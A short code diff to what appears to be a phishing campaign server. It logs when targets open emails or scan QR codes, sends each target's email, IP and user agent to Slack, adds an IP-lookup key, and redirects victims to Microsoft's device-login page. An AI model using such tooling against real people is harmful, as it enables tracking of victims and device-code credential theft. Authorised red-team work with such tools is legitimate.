@@ -64,7 +64,7 @@ def init_app(config: ConfigParser, emailer: Emailer) -> redirect:
             logging.error(f"Invalid email address provided: '{request.url}' from {request.headers.get('X-Forwarded-For')}")  # fmt: skip
             return redirect("https://microsoft.com/", code=302)
         
-        notify_slack(config.get("SLACK","WEBHOOK"),"Email Opened",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
+        notify_slack(config.get("SLACK","WEBHOOK"),config.get("SLACK","IPINFO_KEY"),"Email Opened",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
         return redirect("https://microsoft.com/", code=302)
     
     @app.route(route, methods=["GET"])
@@ -84,7 +84,7 @@ def init_app(config: ConfigParser, emailer: Emailer) -> redirect:
             return redirect("https://microsoft.com/", code=302)
         
         logging.info(f"{request.headers.get('X-Forwarded-For')} Target [{target_email}] arrived at URL: {request.url}")
-        notify_slack(config.get("SLACK","WEBHOOK"),"QR Accessed / Clicked Link",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
+        notify_slack(config.get("SLACK","WEBHOOK"),config.get("SLACK","IPINFO_KEY"),"QR Accessed / Clicked Link",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
 
 
 
@@ -149,3 +149,4 @@ def init_app(config: ConfigParser, emailer: Emailer) -> redirect:
 
         # Redirect to Microsoft Device Login
         return redirect("https://microsoft.com/devicelogin", code=302)
+        
